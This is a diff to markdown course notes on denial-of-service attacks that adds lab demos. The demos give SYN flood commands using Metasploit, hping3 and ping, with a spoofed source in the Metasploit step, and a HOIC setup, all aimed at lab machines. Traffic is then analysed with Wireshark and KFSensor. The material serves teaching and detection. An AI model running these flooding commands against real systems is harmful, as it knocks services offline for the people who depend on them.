@@ -124,6 +124,37 @@ sequenceDiagram
 ---
 
 
+💡 Demo
+---
+- [Step By Step Procedure To Configure IIS On The Windows Server](https://thesecmaster.com/step-by-step-procedure-to-configure-iis-on-the-windows-server/)
+- [SYN Flooding](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/9-Denial-of-Service/1-SYN-Flooding.md)
+  - Launch SYN flooding against Windows server from Parrot
+    ```bash
+    # 0. find services on Windows server
+    nmap -A WindowsIP
+
+    # ATTN: Launch the three attacks below one by one
+    # 1. Attack IIS with Metasploit auxiliary module synflood
+    msfconsole
+    msf> use auxiliary/dos/tcp/synflood
+    synflood> options
+    synflood> set RHSOT WindowsIP
+    synflood> set RPORT 80
+    synflood> set SHOST SpoofIP
+    synflood> run
+
+    # 2. Perform SYN flooding using hping3
+    hping3 -S WindowsIP -a KarrotIP -p 80 --flood
+
+    # 3. Perform ping food
+    ping -f WindowsIP
+    ```
+  - Examine the DoS Attack on Windows server for each attack above
+    - Install [Wireshark](https://www.wireshark.org/)
+    - Analyze DoS traffics with Wireshark
+    - Check Performance tab on Task Manager
+
+
 Flooding Attacks
 ---
 - Overload the network capacity on some link to a server
@@ -197,13 +228,6 @@ flowchart TD
 - the layered control structure obscures the path back to the attacker
 
 
-🔭 Explore
----
-- [Tribe Flood Network](https://en.wikipedia.org/wiki/Tribe_Flood_Network)
-- [High Orbit Ion Cannon](https://en.wikipedia.org/wiki/High_Orbit_Ion_Cannon)
-- [Low Orbit Ion Cannon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon)
-
-
 How to increase DoS attack effect?
 ---
 - Exploit resource-consuming operations that are disproportionate to the attack effort
@@ -247,6 +271,32 @@ server
   - Countermeasure of delay binding with a load balancer 
     - checks the completeness of HTTP request header
     - only forward complete HTTP request to web server
+
+
+🔭 Explore
+---
+- [Tribe Flood Network](https://en.wikipedia.org/wiki/Tribe_Flood_Network)
+- [High Orbit Ion Cannon](https://en.wikipedia.org/wiki/High_Orbit_Ion_Cannon)
+- [Low Orbit Ion Cannon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon)
+
+
+💡 Demo
+---
+- [DDoS attack using HOIC](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/9-Denial-of-Service/2-DDoS-using-HOIC.md)
+- Attack Parrot from Windows server
+  - On Windows server, download and install [High Orbit Ion Cannon](https://en.wikipedia.org/wiki/ High_Orbit_Ion_Cannon) on Windows Server
+    - Run HOIC and add the target as Parrot
+      - URL: http://ParrotIP
+      - Power: high
+      - Booster: GenericBoost.hoic
+    - THREADS: 30
+    - FIRE THE LAZER!
+  - On Parrot analyze the attack with Wireshark
+    ```bash
+    # 1. launch a simple HTTP server
+    python3 -m http.server 80
+    # 2. access from Windows: http://ParotIP
+    ```
 
 
 Reflection Attacks
@@ -371,5 +421,30 @@ Responding to Denial-of-Service Attacks
   - Analyze the attack and the response for future handling
 
 
+💡 Demo
+---
+- [Detecting DoS Attack traffic](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/9-Denial-of-Service/3-Detecting-DoS-Traffic.md)
+- On Windows server
+  - Download and install [KFSensor](http://www.keyfocus.net/kfsensor/) and [Wireshark](https://www.wireshark.org/)
+  - Run KFSensor and setup DoS options
+- On Karrot
+  ```bash
+  # 1. check if port 80 is open on Windows
+  nmap -p 80 WindowsIP
+  # 2. Launch SYN flooding attack against Windows IIS
+  hping3 -d 100 -S -p 80 --flood WindowsIP
+  # 3. go back to Windows and see it becomes almost irresponsive
+  # which means the related resources of Windows are completely exhausted. 
+  # This means that the DoS attack is being successfully performed
+  # 4. In Parrot, press CTRL+C to stop hping3
+  ```
+- Go back to Windows
+  - check that KFSensor detected the DoS attack
+  - analyze packet dump from KFSensor with Wireshark
+
+
 # References
 - [CISA DDoS quick guide](https://www.cisa.gov/sites/default/files/publications/DDoS%20Quick%20Guide.pdf)
+- [Configure IIS Web Server on Windows Server 2019](https://computingforgeeks.com/install-and-configure-iis-web-server-on-windows-server/)
+- [Ethical-Hacking-Labs/9-Denial-of-Service](https://github.com/Samsar4/Ethical-Hacking-Labs/tree/master/9-Denial-of-Service)
+- [Ethical-Hacking-Labs/8-Social-Engineering](https://github.com/Samsar4/Ethical-Hacking-Labs/tree/master/8-Social-Engineering)
